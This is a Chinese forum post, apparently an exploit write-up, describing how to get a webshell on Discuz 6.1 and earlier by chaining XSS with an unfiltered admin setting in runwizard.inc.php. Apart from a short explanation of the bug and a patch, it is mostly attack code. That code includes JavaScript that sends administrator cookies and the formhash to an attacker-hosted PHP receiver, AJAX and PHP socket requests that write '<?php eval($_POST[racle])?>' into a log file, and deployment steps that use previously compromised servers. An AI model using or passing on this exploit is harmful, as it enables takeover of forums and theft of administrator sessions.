@@ -1,0 +1,220 @@
+Discuz XSS得webshell
+By racle @tian6.com
+欢迎转帖.但请保留版权信息.
+受影响版本:Discuz<=6.1.0,gbk+utf+big5
+
+新增加完全JS利用版本,只有一个文件.ajax-racle.js.有效版本提升至DZ6.1(理论上7.0版本都可以,但是6.1以上版本都已经默认打上补丁),新增浏览器版本判断,对方浏览器为IE或FIREFOX都有效.
+
+
+3天前有朋友在论坛问过,说Discuz有个非论坛创始人获得WEBSHELL的漏洞,是superhei早前发出来的一大堆DISCUZ漏洞之一.见原帖:http://bbs.tian6.com/redirect.ph ... 54794&ptid=8706
+当时我说一会就弄出来给大家,但是实际上一接触,发现这个漏洞本身需要管理员后台权限,要广泛普遍的利用还是很复杂的,主要是以下几个问题,所以拖到今天才基本完工.
+
+分析和写EXP的过程中,得到t0by57,Superhei的大力帮助.他们PHP和JS都不错的哦!希望大家看这篇文章时,更注意分析和明白的过程,毕竟XSS是目前WEB安全的最大头戏.各种形式:XSIO,Cross Iframe Trick,crsf等等..
+本帖补充其中一个FLASH XSS应用方法:配合Discuz得shell-Flash XSS
+
+
+----------------------------------------------------------前言分隔线-----------------------------------------------------------------------------
+
+
+problem1:漏洞页面runwizard.inc.php数据提交方式为post.需要模拟POST提交.
+
+problem2:DISCUZ论坛在数据提交的时候还验证了referer,因此还要伪造一下.php socket和js都可以伪造referer.
+
+problem3:formhash()函数采用了用户名+密码+XXX的算法得出,程序本身没办法模拟算出来,于是又耗费了我一段时间,最终想到个傻办法,从源代码里读出来.呵呵.这里是参考了superhei的一个旧EXP想出来的.
+
+
+下面,我为大家简单说说这个漏洞的成因和补的办法.这里是有漏洞的文件代码:bbs/admin/runwizard.inc.php,里面有个函数function saverunwizardhistory() {
+
+        global $runwizardfile, $runwizardhistory;
+
+        $fp = fopen($runwizardfile, 'w');
+
+        fwrite($fp, serialize($runwizardhistory));
+
+        fclose($fp);
+
+}
+复制代码serialize($runwizardhistory)直接就写进$fp里.runwizardhistory是什么呢?是论坛一些基本的配置信息,譬如论坛名.反应在论坛后台,位置是:discuz.com/bbs/admincp.php?action=runwizard&step=2.论坛名称,地址等三项信息都没任何过滤.该三项内容任何一项都可以直接写入一句话,提交,然后保存在缓存:bbs/forumdata/logs/runwizardlog.php里.
+以下是修补的办法:function saverunwizardhistory() {
+
+        global $runwizardfile, $runwizardhistory;
+
+        $fp = fopen($runwizardfile, 'w');
+
+        $s = '<?php exit;?>';
+
+        $s .= serialize($runwizardhistory);
+
+        fwrite($fp, $s);
+
+        fclose($fp);
+
+}
+复制代码加写 '<?php exit;?>';到最前面,退出并且忽略该文件后面所有PHP代码.这么即使里面有一句话,也不能再被执行.
+
+
+
+----------------------------------------漏洞的成因和利用方法分隔线-----------------------------------------------------------------------------
+
+
+  以上是该漏洞的成因和利用方法.大家看到这里,估计也认为这是个鸡肋漏洞了吧,首先要有管理员权限,有后台权限,然后才能上WEBSHELL,实话说,有后台权限,拿SHELL的办法也并不止这一个.所以这个洞的价值,看起来就不大了.当然,这个已经被发布的nday不是我本帖要讲的重点.这里我主要是想告诉大家,将XSS,Crsf和本漏洞联合起来的办法.这样该洞价值就大很多了.
+
+我们的思路是:论坛上有个xss点,Crsf flash(的确有,Discuz! member.php xss bug,Discuz! 数据库错误信息xss bug,Discuz! flash Crsf bug,Discuz! admincp.php xss bug,Discuz![flash] xss bug),管理员点击或浏览后,就执行了我们的JS,带他到外部一个JS中,通过JS获得他的COOKIES,获得他的HASH,然后经过外部一个PHP封装SOCKET以POST的形式提交前面说的动作,如果论坛没有补上该问题(目前没几个论坛补了.当然,天阳已经补了.^^),那么就会产生bbs/forumdata/logs/runwizardlog.php这个WEBSHELL.
+
+这篇文章主要不是给大家个EXP,然后让大家拿着到处乱黑的,主要是讲方法,讲思路.因为这里学问不少.
+
+首先我们要看,怎么通过JS,获得管理员COOKIES,然后把COOKIES传递给最终提交的PHP.获得的办法相信大家都知道,但是传递的办法,譬如以图片形式传递,就非常稳定和实用.是实现AJAX本地语言到服务器语言PHP的好办法.JS部分代码:
+
+var url="http://目标网站/admincp.php";      
+
+/*获得cookies*/
+
+function getURL(s) {
+
+var image = new Image();
+
+image.style.width = 0;
+
+image.style.height = 0;
+
+image.src = s;
+
+}
+
+getURL("我们做好的接收cookies的.php?x="+encodeURIComponent(document.cookie));  //这里就通过image变量传给了php
+复制代码php以get方式接收过来的变量.$cookies=$_GET['x'];
+复制代码同理,hash我也是这么传到PHP里.不过HASH的获得方法也是很有意思的,众所周知,discuz有formhash来保护每个授权访问的唯一性.但是你也可以发现,在论坛页面用户退出的地方,引用了这个hash.我们要做的,就是从页面的源文件里搜索出hash,筛选出来,传递给PHP即可.筛选的办法很多,你有兴趣的话,可以看看我的筛选JS代码(而且这里discuz其实还留了一手,呵呵) :)
+
+
+获得了cookies和hash以后,我们需要结合完整数据,做一次模拟提交,大家可以看看,这个是我之前写好的AJAX提交方式:var url="http://tian6.com/raclebbs/";
+
+
+
+/*hash*/
+
+var xmlHttpReq = new ActiveXObject("MSXML2.XMLHTTP.3.0");
+
+xmlHttpReq.open("GET", url+"admincp.php?action=home", false);
+
+xmlHttpReq.send();
+
+var resource = xmlHttpReq.responseText;
+
+var numero = resource.search(/formhash/);
+
+var formhash=encodeURIComponent(resource.substr(numero+17,8));
+
+
+
+var post="formhash="+formhash+"&anchor=&settingsnew%5Bbbname%5D=1&settingsnew%5Bsitename%5D=<%3Fphp+eval(%24_POST[racle])%3F>racle%40tian6.com&settingsnew%5Bsiteurl%5D=http%3A%2F%2Fwww.comsenz.com%2F&step2submit=%E4%B8%8B%E4%B8%80%E6%AD%A5";//构造要携带的数据 
+
+xmlHttpReq.open("POST",url+"admincp.php?action=runwizard&step=3",false);//使用POST方法打开一个到服务器的连接，以异步方式通信 
+
+xmlHttpReq.setRequestHeader("Referer", url);
+
+xmlHttpReq.setrequestheader("Accept","image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*");
+
+xmlHttpReq.setrequestheader("content-length",post.length); 
+
+xmlHttpReq.setrequestheader("content-type","application/x-www-form-urlencoded"); 
+
+xmlHttpReq.send(post);//发送数据
+复制代码这里HASH我假设正确,这样提交,也无须cookies
+
+再看看以PHP SOCKET形式提交.$sock = fsockopen("$url", 80, $errno, $errstr, 30);
+
+if (!$sock) die("$errstr ($errno)\n");
+
+$data = 'formhash='.$hash.'&anchor=&settingsnew%5Bbbname%5D=Discuz&settingsnew%5Bsitename%5D=<%3Fphp+eval(%24_POST[racle])%3F>racle%40tian6.com&settingsnew%5Bsiteurl%5D=http%3A%2F%2Fwww.comsenz.com%2F&step2submit=%E4%B8%8B%E4%B8%80%E6%AD%A5';
+
+
+
+fwrite($sock, "POST http://$url/admincp.php?action=runwizard&step=3 HTTP/1.1\r\n");
+
+fwrite($sock, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*\r\n");
+
+fwrite($sock, "Referer: http://$url/admincp.php?action=runwizard&step=2\r\n");
+
+fwrite($sock, "Accept-Language: zh-cn\r\n");
+
+fwrite($sock, "Content-Type: application/x-www-form-urlencoded\r\n");
+
+fwrite($sock, "Accept-Encoding: gzip, deflate\r\n");
+
+fwrite($sock, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) ; User-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; http://bsalsa.com) (Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)); .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n");
+
+fwrite($sock, "Host: $url\r\n");
+
+fwrite($sock, "Content-Length: ".strlen($data)."\r\n");
+
+fwrite($sock, "Connection: Keep-Alive\r\n");
+
+fwrite($sock, "Cache-Control: no-cache\r\n");
+
+fwrite($sock, "Cookie:".$cookies."\r\n\r\n");
+
+fwrite($sock, $data);
+
+
+
+$headers = "";
+
+while ($str = trim(fgets($sock, 4096)))
+
+     $headers .= "$str\n";
+
+echo "\n";
+
+$body = "";
+
+while (!feof($sock))
+
+     $body .= fgets($sock, 4096);
+
+fclose($sock);
+
+echo $body;
+复制代码整个漏洞XSS应用大致如此,下面附上JS文件,PHP封装好的提交文件.利用文件限制一下,已注册用户才可以下载,刚来也没关系,仔细看看前面的分析,你也差不多能写出来.^^
+
+
+-------------------------------------------XSS文件分析分隔线-----------------------------------------------------------------------------
+
+
+1:PHP SOCKET利用方法首先打开racle.js
+
+var url="http://tian6.com/raclebbs/admincp.php?action=home"; //改成你要XSS攻击的目标,譬如http://www.discuz.com/admincp.php?action=home
+
+
+
+然后打开racle@tian6.php
+
+$url="racle@tian6.com";   //改成你要XSS攻击的目标,譬如www.discuz.com
+
+
+
+如果目标论坛为6.1版本,无须再改动.如果目标为6.0或以下版本,请修改:
+
+getURL("racle@tian6.php?resource_hash="+encodeURIComponent(resource.substr(numero+17,8))+"&x="+encodeURIComponent(document.cookie));
+
+为
+
+getURL("racle@tian6.php?resource_hash="+encodeURIComponent(resource.substr(numero+9,8))+"&x="+encodeURIComponent(document.cookie));
+复制代码2:JS利用方法打开ajax-racle.js,修改var url="http://tian6.com/raclebbs/";为你要攻击的论坛地址.
+
+
+
+如果目标论坛为6.1版本,无须再改动.如果目标为6.0或以下版本,请修改:
+
+var formhash=encodeURIComponent(resource.substr(numero+17,8));
+
+为
+
+var formhash=encodeURIComponent(resource.substr(numero+9,8));
+复制代码ok.以上两种方法则其一.在攻击前,我们应该先看看论坛打上补丁没有,你可以尝试访问:http://target.com/bbs/forumdata/logs/runwizardlog.php,如果一片空白,那就没戏咯.不是空白就会有些论坛信息出现,但也不代表就肯定存在漏洞,因为可能人家补过之后没有更新过论坛信息而已.目前来说,有8成把握吧.
+
+如果是第一种方法,就把racle.js,还有racle@tian6.php文件上传到一个可以执行PHP的地方,譬如你以前拿下的WEBSHELL里.两个文件需在同一目录下.记得该空间要支持PHP.然后在论坛以<script src=http://你放好的地方/racle.js></script>构造好XSS点.
+
+如果是第二种方法,就把ajax-racle.js,上传到一个你以前拿下的WEBSHELL里,然后在论坛以<script src=http://你放好的地方/ajax-racle.js></script>构造好XSS点.
+
+不管你用什么方法,等到管理员一点该连接或者浏览一下论坛,他论坛bbs/forumdata/logs/runwizardlog.php里就多了个<?php eval($_POST[racle])?> ^^.赶紧拿控制端连上去吧.
+ 
